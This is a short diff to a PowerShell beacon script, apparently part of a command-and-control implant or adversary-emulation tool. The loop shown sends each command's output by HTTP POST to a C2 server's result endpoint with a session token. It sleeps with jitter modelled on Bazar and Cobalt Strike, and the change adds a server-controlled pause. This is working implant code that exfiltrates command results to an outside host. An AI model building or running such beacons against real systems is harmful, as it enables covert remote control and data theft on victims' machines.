@@ -103,11 +103,14 @@ for ($i = 0; $i -lt $count; $i++) {
     if ([string]::IsNullOrWhiteSpace($result)) { $result = "(no output)" }
     $body = [System.Text.Encoding]::UTF8.GetBytes($result)
     Invoke-WebRequest -Method POST -Uri "$c2Url/result?session=$token&task=$task" -Body $body -UseBasicParsing -TimeoutSec 10 | Out-Null
-    # realistic beacon cadence: fixed sleep + random jitter (Bazar/CS-like)
+    # realistic beacon cadence: fixed sleep + random jitter (Bazar/CS-like),
+    # plus an optional per-command runbook pause from the server
+    $pause = 0
+    if ($null -ne $taskObj.pause) { $pause = [int]$taskObj.pause }
     $s = $sleep
     if ($jitter -gt 0) {
         $s = [Math]::Max(0, $sleep + (Get-Random -Minimum (-$jitter) -Maximum ($jitter + 1)))
     }
-    Start-Sleep -Seconds $s
+    Start-Sleep -Seconds ($s + $pause)
 }
 Write-Output "beacon cycle complete (stage=$stage host=$hostAlias token=${token})"
